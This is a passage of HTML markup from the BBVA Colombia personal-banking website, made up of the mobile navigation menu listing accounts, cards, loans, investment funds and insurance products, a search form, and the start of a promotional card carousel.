            <span itemprop="name" class="linkwithicon__text">Sostenibilidad BBVA</span>
        </span>
    </a>


        <br/>
    
        
        

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_659572967" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" title="enlace a blog bbva" aria-label="enlace a blog bbva" href="/personas/blog.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/4_024_quotemark.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Blog </span>
        </span>
    </a>


        <br/>
    
        
        

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1221498243" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" title="enlace a beneficios" aria-label="enlace a beneficios" href="/personas/productos/tarjetas-de-credito/beneficios.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/5_016_point.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Beneficios BBVA</span>
        </span>
    </a>


        <br/>
    
        
        

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1583636697" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" title="Atención al cliente" aria-label="Atención al cliente" href="/personas/atencion-al-cliente.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_003_myprofile.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Atención al cliente</span>
        </span>
    </a>


        <br/>
    
        
        

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1281190392" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_blank" rel="noopener noreferrer" title="enlace a oficinas y cajeros. Abre en nueva ventana" aria-label="enlace a oficinas y cajeros. Abre en nueva ventana" href="/personas/oficinas.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_026_mobile.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Oficinas y cajeros</span>
        </span>
    </a>


        <br/>
    
        
        

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_379865119" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" href="/personas/preguntas-frecuentes.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/4_003_help.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Preguntas Frecuentes</span>
        </span>
    </a>


        <br/>
    
        
        

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1691019573" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " href="https://www.bbva.com/es/co/?utm_source=bbvacol&utm_campaign=modulo_col" target="_blank" rel="noopener noreferrer" title="Newsroom BBVA. Abre en nueva ventana" aria-label="Newsroom BBVA. Abre en nueva ventana">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_028_international.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Newsroom BBVA</span>
        </span>
    </a>


        <br/>
    
</div>

    
</nav>
                </div>
                <div class="mainnavigation--mobile" itemscope itemtype="https://schema.org/SiteNavigationElement">
                    


    




    



<div class="mainnavigation__base">
    <nav class="mainnavigation__list" role="navigation">
         <a href="#" class="mainnavigation__item mainnavigation--active" aria-label="Personas">
            Personas
        </a>
    
         <a class="mainnavigation__item " aria-label="Empresas" href="/empresas.html">
            Empresas
        </a>
    </nav>
<nav class="megamenu__flyout">
    <ul class="megamenu__flyout__list" role="list" itemscope itemtype="http://schema.org/ListItem">
        <li>
            <a href="#" class="megamenu__navigation__home">
                <i aria-hidden="true" class="bbva-icon bbva-icon__3_002_home"></i>Inicio
             </a>
        </li>
        
            
            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}'>
                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="cuentas" href="/personas/productos/cuentas.html">
                    <span itemprop="name" class="megamenu__navigation__text">Cuentas</span>
                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                </a>
                
                    
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="cuentas" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/cuentas.html">
                <span itemprop="name">Cuentas</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/en-linea.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuenta en Línea</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/nomina.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuentas de Nómina</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/cuentas/nomina/pensionados.html">
                                <span itemprop="item name">Cuenta de Nómina para Pensionados</span>
                            </a>
                        </li>
                    
                </ul>
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/ahorro.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuentas de Ahorro</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/corriente.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuentas Corrientes</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/cuentas/portafolios.html">
                    <span class="megamenu__navigation__title" itemprop="name">Portafolios</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/cuentas.html">
                        <span itemprop="item name">cuentas</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

                
            </li>
            
            
        
            
            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}'>
                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="tarjetas" href="/personas/productos/tarjetas.html">
                    <span itemprop="name" class="megamenu__navigation__text">Tarjetas</span>
                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                </a>
                
                    
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="tarjetas" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/tarjetas.html">
                <span itemprop="name">Tarjetas</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/tarjetas/credito.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjetas de Crédito</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/visa.html">
                                <span itemprop="item name">Tarjetas Visa</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/mastercard.html">
                                <span itemprop="item name">Tarjetas Mastercard</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/amparada.html">
                                <span itemprop="item name">Tarjeta Amparada</span>
                            </a>
                        </li>
                    
                </ul>
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/tarjetas/debito.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjeta Débito</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/tarjetas/puntos-y-promociones.html">
                    <span class="megamenu__navigation__title" itemprop="name">Puntos y promociones</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/pago-con-puntos.html">
                        <span itemprop="item name">Pago con puntos</span>
                    </a>
                </li>
            
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/credito/avances.html">
                        <span itemprop="item name">Avances</span>
                    </a>
                </li>
            
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/tarjetas/beneficios.html">
                        <span itemprop="item name">Beneficios</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

                
            </li>
            
            
        
            
            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}'>
                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="prestamos" href="/personas/productos/prestamos.html">
                    <span itemprop="name" class="megamenu__navigation__text">Préstamos</span>
                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                </a>
                
                    
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="prestamos" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/prestamos.html">
                <span itemprop="name">Préstamos</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/online.html">
                    <span class="megamenu__navigation__title" itemprop="name">Préstamos en Línea</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/vivienda.html">
                    <span class="megamenu__navigation__title" itemprop="name">Créditos de Vivienda</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/consumo.html">
                    <span class="megamenu__navigation__title" itemprop="name">Créditos de Consumo</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/prestamos/vehiculo.html">
                    <span class="megamenu__navigation__title" itemprop="name">Crédito de Vehículo</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/servicios-digitales/adelanto-de-nomina.html">
                        <span itemprop="item name">Adelanto de Nómina</span>
                    </a>
                </li>
            
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/prestamos/consumo/libranza.html">
                        <span itemprop="item name">Crédito de Libranza</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

                
            </li>
            
            
        
            
            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}'>
                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="inversion" href="/personas/productos/inversion.html">
                    <span itemprop="name" class="megamenu__navigation__text">Inversiones</span>
                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                </a>
                
                    
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="inversion" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/inversion.html">
                <span itemprop="name">Inversiones</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/inversion/cdt.html">
                    <span class="megamenu__navigation__title" itemprop="name">CDT</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/online.html">
                                <span itemprop="item name">CDT Online</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/tradicional.html">
                                <span itemprop="item name">CDT Tradicionales</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/largo-plazo.html">
                                <span itemprop="item name">CDT Largo Plazo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/cdt/tasa-variable-dtf.html">
                                <span itemprop="item name">CDT Tasa Variable</span>
                            </a>
                        </li>
                    
                </ul>
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/inversion/fondos.html">
                    <span class="megamenu__navigation__title" itemprop="name">Fondos de Inversión </span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/digital.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Digital</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/paramo.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Páramo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/efectivo.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Efectivo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/pais.html">
                                <span itemprop="item name">Fondo de Inversión BBVA País</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/fam.html">
                                <span itemprop="item name">Fondo de Inversión BBVA FAM</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/plazo-30.html">
                                <span itemprop="item name">Fondo de Inversión BBVA Plazo 30</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/balanceado-global.html">
                                <span itemprop="item name">Fondo de Inversión Balanceado Global</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/balanceado-gaia.html">
                                <span itemprop="item name">Fondo de Inversión Balanceado Gaia</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/inversion/fondos/multiestrategia.html">
                                <span itemprop="item name">Fondos Multiestrategias</span>
                            </a>
                        </li>
                    
                </ul>
            </div>
            
        </div>
    </div>

                
            </li>
            
            
        
            
            
            
            <li>
                <a tabindex="0" class="megamenu__navigation__link accordion--nosubmenu" href="/personas/productos/pensionados.html">
                    <span itemprop="name">Pensionados</span>
                </a>
            </li>
        
            
            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}'>
                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="seguros" href="/personas/productos/seguros.html">
                    <span itemprop="name" class="megamenu__navigation__text">Seguros</span>
                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                </a>
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="seguros" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/seguros.html">
                <span itemprop="name">Seguros</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/seguros/libres.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Libres</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/soat.html">
                                <span itemprop="item name">SOAT Virtual</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/oncologico.html">
                                <span itemprop="item name">Seguro Oncológico</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/familia-vital.html">
                                <span itemprop="item name">Seguro de Familia Vital</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hogar-y-contenidos.html">
                                <span itemprop="item name">Seguro Hogar y Contenidos</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/autos.html">
                                <span itemprop="item name">Seguro de Autos</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hurto-de-tarjeta.html">
                                <span itemprop="item name">Seguro de Hurto de Tarjeta</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/accidentes-personales-salud.html">
                                <span itemprop="item name">Seguro de Accidentes Personales Salud</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hurto-atm.html">
                                <span itemprop="item name">Seguro de Hurto ATM</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/multiriesgo-hogar.html">
                                <span itemprop="item name">Seguro Multiriesgo para Hogar</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/vida-individual.html">
                                <span itemprop="item name">Seguro de Vida Indivual</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/hogar-individual.html">
                                <span itemprop="item name"> Seguro de Hogar Individual</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/cuota-segura-trabajadores-dependientes.html">
                                <span itemprop="item name">Seguro Cuota Segura Trabajadores Dependientes</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/libres/cuota-segura-trabajadores-independientes.html">
                                <span itemprop="item name">Seguro Cuota Segura Trabajadores Independientes</span>
                            </a>
                        </li>
                    
                </ul>
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/seguros/deudores.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Deudores</span>
                </a>
                
                <ul>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/vida.html">
                                <span itemprop="item name">Seguro de Vida Colectivo</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/vehiculos.html">
                                <span itemprop="item name">Seguro de Vehículos</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/tarjeta-de-credito.html">
                                <span itemprop="item name">Seguro de Vida para Tarjetas de Crédito</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/vida-colectivo.html">
                                <span itemprop="item name">Seguro Vida Colectivo Crédito Hipotecario y/o Leasing Habitacional</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/incendio-y-terremoto.html">
                                <span itemprop="item name">Seguro de incendio y terremoto para créditos hipotecario y/o leasing habitacional</span>
                            </a>
                        </li>
                    
                        <li>
                            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/seguros/deudores/seguro-todo-riesgo-construccion.html">
                                <span itemprop="item name">Seguro Todo Riesgo Construcción</span>
                            </a>
                        </li>
                    
                </ul>
            </div>
            
        </div>
    </div>

                
            </li>
            
            
        
            
            
            
            <li>
                <a tabindex="0" class="megamenu__navigation__link accordion--nosubmenu" href="/personas/productos/divisas.html">
                    <span itemprop="name">Divisas</span>
                </a>
            </li>
        
            
            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}'>
                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="banca-personal" href="/personas/productos/banca-personal.html">
                    <span itemprop="name" class="megamenu__navigation__text">Banca Personal</span>
                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                </a>
                
                    
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="banca-personal" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/banca-personal.html">
                <span itemprop="name">Banca Personal</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/inversion.html">
                    <span class="megamenu__navigation__title" itemprop="name">Inversión Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/cuentas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuentas Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/tarjetas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjetas Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/prestamos.html">
                    <span class="megamenu__navigation__title" itemprop="name">Préstamos Banca Personal</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/banca-personal/seguros.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Banca Personal</span>
                </a>
                
                
            </div>
            
        </div>
    </div>

                
            </li>
            
            
        
            
            <li data-component="accordion" role="listitem" data-component-params='{&quot;route&quot;: false, &quot;viewport&quot;:[&quot;tablet&quot;, &quot;mobile&quot;]}'>
                <a data-accordion-toogle tabindex="-1" role="button" aria-expanded="false" class="megamenu__navigation__link megamenu__navigation__primary accordion__list__item__heading" data-menu-expand="premium" href="/personas/productos/premium.html">
                    <span itemprop="name" class="megamenu__navigation__text">Premium</span>
                    <i aria-hidden="true" class="accordion--icon bbva-icon bbva-icon__2_017_forward"></i>
                </a>
                
                    
    <div class="megamenu__flyout__secondary accordion__list" data-menu-name="premium" aria-expanded="false" aria-hidden="true" data-accordion-content>
        <div class="accordion__list__content">
            <a itemprop="url" class="megamenu__navigation__link megamenu__flyout__categorySelected" href="/personas/productos/premium.html">
                <span itemprop="name">Premium</span>
            </a>
            <div class="accordion__list__content--haschilden">
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/inversion.html">
                    <span class="megamenu__navigation__title" itemprop="name">Inversión Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/cuentas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Cuentas Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/tarjetas.html">
                    <span class="megamenu__navigation__title" itemprop="name">Tarjetas Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/prestamos.html">
                    <span class="megamenu__navigation__title" itemprop="name">Financiación Premium</span>
                </a>
                
                
            
                <a class="megamenu__navigation__highlight megamenu__flyout__subcategory" href="/personas/productos/premium/seguros.html">
                    <span class="megamenu__navigation__title" itemprop="name">Seguros Premium</span>
                </a>
                
                
            </div>
            <ul class="megamenu__flyout__linkwithicon">
                <li>
                    <a itemprop="url" target="_self" class="megamenu__navigation__link megamenu__flyout__template" href="/personas/productos/premium/soluciones-no-financieras.html">
                        <span itemprop="item name">Soluciones No Financieras</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

                
            </li>
            
            
        
            
            
            
            <li>
                <a tabindex="0" class="megamenu__navigation__link accordion__list__item__heading" href="/personas/productos/banca-privada.html">
                    <span itemprop="name">Banca privada</span>
                </a>
            </li>
        
    </ul>
</nav>
        
    
        
    
</div>
                </div>
            </div>
            <div class="search search--mobile">





    




    




<div class="search__base " itemscope data-component="search" data-component-params='{"open": false, "version" : 1, "idWeb" : ""}' data-search-url="https://bbva-proxy-cloudsearch-sp.appspot.com/v1/cloudsearch/suggest?max=15&amp;site=colombia&amp;access=p&amp;format=os&amp;client=colombia&amp;q=&lt;query>" data-search-query="&lt;query>" aria-hidden="false">
    <div class="container">
        <link>
        <div class="container search__bar">
            <form action="/personas/buscador.html" class="search__form" itemprop="potentialAction" itemscope itemtype="http://schema.org/SearchAction">
                <meta itemprop="target" content="/personas/buscador.html?_charset_=UTF-8&q={search}"/>
                <input type="hidden" value="UTF-8" name="_charset_"/>
                <button type="submit" tabindex="2" class="search__icon-btn" aria-label="Hacer búsqueda">
                    <i class="bbva-icon bbva-icon__3_001_search"></i>
                </button>
                <div class="search__label" role="combobox" aria-expanded="false" aria-haspopup="listbox">
                    <label class="search__txt">Hacer búsqueda, Pulsa enter</label>
                    <input tabindex="1" aria-autocomplete="list" autocomplete="off" type="text" name="search" placeholder="Buscar aquí" class="search__input" aria-label="Hacer búsqueda, Pulsa enter" aria-activedescendant="" itemprop="query-input"/>
                </div>
                <span class="search__instructional-text">Pulsa enter</span>
                <button class="search__close-btn" tabindex="3" aria-label="Cerrar formulario de búsqueda">
                    <i class="bbva-icon bbva-icon__2_022_close"></i>
                </button>
                <input type="submit" value="Search" class="hidden search__hiddeninput"/>
            </form>
            <div class="search__container">
                <div class="search__suggestions">
                    <span class="search__suggestions__title">Sugerencias</span>
                    <ul role="listbox" class="search__suggestions__container"></ul>
                </div>
            </div>
        </div>
    </div>
</div></div>
        </div>
        <div class="megamenu__cards container" itemscope itemtype="http://schema.org/Service" data-component="megamenucards">
            <p class="megamenu__cards__title">Oportunidades</p>
            <div class="megamenu__cards__container">
                <div class="swiper-button-prev megamenu--preventfocus">
                    <i class="bbva-icon bbva-icon__2_046_back"></i>
                </div>
                <div class="container swiper-container">
                    <ul class="megamenu__cardlist swiper-wrapper" itemprop="hasOfferCatalog" itemscope itemtype="http://schema.org/OfferCatalog">
                        <li itemprop="itemListElement" itemscope itemtype="http://schema.org/OfferCatalog" class="megamenu__card swiper-slide">
                            
    <a class="megamenu__card__link hidden" itemprop="url" tabindex="-1" href="/personas/oportunidades/tu-dia-a-dia.html">
        <div class="megamenu__card__base">
            <div class="megamenu__card__header">
            
                
    

    
        
        
        

        <img sizes="(min-width: 990px) 25vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": ""}' data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/send_money_app_dollar.svg" itemprop="image" class="megamenu__card__image" alt=""/>
    

            
            <p role="presentation" class="megamenu__card__title">Productos para todos los días </p>
            </div>
            <p itemprop="description" class="megamenu__card__text rte">Gestiona tus tarjetas, cuentas o realiza pagos.</p>
        </div>
    </a>

                        </li>
                    
                        <li itemprop="itemListElement" itemscope itemtype="http://schema.org/OfferCatalog" class="megamenu__card swiper-slide">
                            
    <a class="megamenu__card__link hidden" itemprop="url" tabindex="-1" href="/personas/oportunidades/cumple-tus-suenos.html">
        <div class="megamenu__card__base">
            <div class="megamenu__card__header">
            
                
    

    
        
        
        

